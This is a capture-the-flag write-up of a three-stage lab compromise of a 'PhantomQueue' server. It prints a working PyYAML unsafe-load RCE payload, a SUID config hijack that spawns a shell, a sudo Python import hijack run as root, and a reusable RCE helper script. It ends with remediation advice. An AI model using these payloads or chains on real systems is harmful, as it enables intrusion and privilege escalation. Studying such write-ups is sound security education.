# Phantom C2 — YAML RCE, a world-writable SUID config, and a sudo import hijack

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/phantom-c2/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — The "PhantomQueue" staging server parses request bodies with
> `yaml.load(..., Loader=yaml.Loader)`, so a crafted `!!python/object/apply`
> payload gives RCE as `www`. A SUID `queuectl` reads its runner path from a
> world-writable `queue.conf`, switching UID (but not GID) to `deploy`. Because
> `/opt/phantom` is group-writable by `deploy`, a `sudo`-allowed `report.py`
> `import`s an attacker-planted module and runs its init code as root.
> **Flag:** `/root/flag` → `NCTF{27ec…}`.

## 1. Briefing

Boot2root, difficulty *insane*. A single root flag, reached through a three-stage
chain: web RCE → SUID helper → sudo rule. Each stage changes exactly one
privilege dimension, which is the trick.

| Field | Value |
|-------|-------|
| Target | `10.100.13.101` |
| Port | `8080/tcp` — `PhantomQueue/2.1` (Python 3.10.12) |
| Flag format | `NCTF{...}` |

## 2. Reconnaissance

```bash
curl -s http://10.100.13.101:8080/
# PhantomQueue/2.1 — POST /api/queue to enqueue a job (YAML body)
```

One reachable port, a Python server, and a job-queue API that accepts a **YAML**
body. YAML plus Python is an immediate deserialization red flag.

## 3. Analysis

The server (`panel.py`) parses the body with the unsafe loader:

```python
job = yaml.load(body, Loader=yaml.Loader)   # full constructor → arbitrary objects
```

`yaml.Loader` (not `SafeLoader`) instantiates arbitrary Python objects, so a
`!!python/object/apply` tag calls any importable callable with our arguments —
classic YAML deserialization RCE.

## 4. Exploitation

### Stage 1 — YAML unsafe-load RCE (→ www, uid 1001)

```http
POST /api/queue HTTP/1.1
Host: 10.100.13.101:8080
Content-Type: application/x-yaml

!!python/object/apply:subprocess.check_output
- - /bin/sh
  - -c
  - id; cat /etc/phantom/queue.conf
```

```text
uid=1001(www) gid=1001(www)
runner=/usr/bin/true
```

### Stage 2 — SUID queuectl (→ deploy, uid 1000)

`queuectl` is SUID `deploy`. It reads `runner=` from `/etc/phantom/queue.conf`
and `execl()`s that path after `setreuid` to `deploy`. The config is `0666`
(world-writable), and — crucially — **only the UID switches; the GID stays
`www`**:

```bash
echo 'runner=/tmp/go.sh' > /etc/phantom/queue.conf
cat > /tmp/go.sh <<'EOF'
#!/bin/sh
exec /bin/sh
EOF
chmod +x /tmp/go.sh
queuectl            # now uid=deploy, gid still www
```

### Stage 3 — sudo module hijack (→ root)

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/phantom/report.py
```

`/opt/phantom` is `2775 root:deploy`, so its **group** can write there. But the
sudo rule only works once our *primary group* is `deploy` — and stage 2 left the
GID as `www`. Fix the group first, then plant a malicious module that
`report.py` imports from its own directory (`sys.path[0] == /opt/phantom`):

```bash
sg deploy -c '
cat > /opt/phantom/phantomlib.py <<EOF
import os
os.system("cp /root/flag /tmp/flag && chmod 644 /tmp/flag")
EOF
sudo /usr/bin/python3 /opt/phantom/report.py
'
cat /tmp/flag
```

`import phantomlib` runs the module's top-level code **as root**, which copies
the flag somewhere world-readable.

## 5. Flag

```text
NCTF{27ec…}
```

## 6. Dead ends & troubleshooting

- **`SafeLoader` assumptions.** If `/api/queue` had used `safe_load`, the
  `!!python/object` tag would raise `ConstructorError` — confirm the loader with
  a `{{7*7}}`-style benign probe (`!!python/object/apply:int [41]`) before firing
  a shell payload.
- **The GID trap.** After `queuectl`, you are `uid=deploy` but still
  `gid=www`. Writing `phantomlib.py` fails with `Permission denied` until you
  switch the primary group with `sg deploy -c ...` (or `newgrp`). This is the
  single most common place to get stuck.
- **Overwrite order.** Set `runner=` *before* invoking `queuectl`; it reads the
  config fresh on each call.

## 7. Lessons & remediation

- **Never `yaml.load` untrusted input.** Use `yaml.safe_load`; the full loader is
  code execution by design.
- **SUID helpers must not trust mutable config.** `queue.conf` at `0666` lets any
  user choose what a SUID binary executes. Make it `root:root 0644`, or better,
  hard-code the runner.
- **Drop the whole credential set.** `setreuid` without `setregid` leaves a
  dangling group that becomes the pivot. Switch UID *and* GID (and supplementary
  groups) together.
- **`import` is execution.** A `sudo`-run script that imports from a
  group-writable directory hands root to that group. Pin `sys.path`, run from a
  directory only root can write, and avoid broad `NOPASSWD` python rules.

## 8. Appendix — one-liner RCE helper

```python
#!/usr/bin/env python3
import sys, requests
cmd = sys.stdin.read()
body = ("!!python/object/apply:subprocess.check_output\n"
        "- - /bin/sh\n  - -c\n  - " + cmd.strip())
r = requests.post("http://10.100.13.101:8080/api/queue",
                  data=body, headers={"Content-Type": "application/x-yaml"}, timeout=30)
print(r.text)
```
